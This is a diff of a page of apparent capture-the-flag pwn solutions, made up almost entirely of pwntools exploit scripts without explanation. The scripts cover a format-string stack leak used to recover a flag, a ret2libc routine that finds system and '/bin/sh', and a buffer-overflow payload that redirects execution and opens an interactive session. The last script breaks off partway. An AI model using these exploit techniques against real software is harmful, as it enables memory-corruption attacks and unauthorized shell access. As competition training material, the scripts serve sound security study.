+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'%12$p-%13$p-%14$p-%15$p-%16$p'</span>
+<span class="n">sla</span><span class="p">(</span><span class="s">'Does Quill manage to win the dance battle?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
+
+<span class="n">flag_l</span> <span class="o">=</span> <span class="p">[</span><span class="s">'6d697b6674636873'</span><span class="p">,</span> <span class="s">'636172747369645f'</span><span class="p">,</span> <span class="s">'756f795f676e6974'</span><span class="p">,</span> <span class="s">'7d'</span><span class="p">]</span>
+
+<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">flag_l</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">):</span>
+                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="warmup-to-the-dark-side">Warmup to the Dark Side</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">30096</span><span class="p">)</span>
+
+<span class="c1"># binary = ''
+# elf = ELF(binary)
+</span><span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'The Dark Side resides at:'</span><span class="p">)</span>
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'leak_addr '</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span><span class="o">*</span><span class="mh">0x40</span>
+<span class="n">sla</span><span class="p">(</span><span class="s">'Jedi Mind tricks dont work on me &gt;&gt;&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
+
+<span class="c1"># mark, learn brop
+</span></code></pre></div></div>
+
+<h2 id="t0ny-tr4n5l4t0r">T0NY TR4N5L4T0R</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./leet'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">26008</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x0804921D</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x22</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'e'</span><span class="o">*</span><span class="mi">4</span> 
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x7</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'lleett'</span> 
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'c'</span>
+
+<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="n">itr</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h2 id="satisfied">SATisfied</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./satisfy'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">34720</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
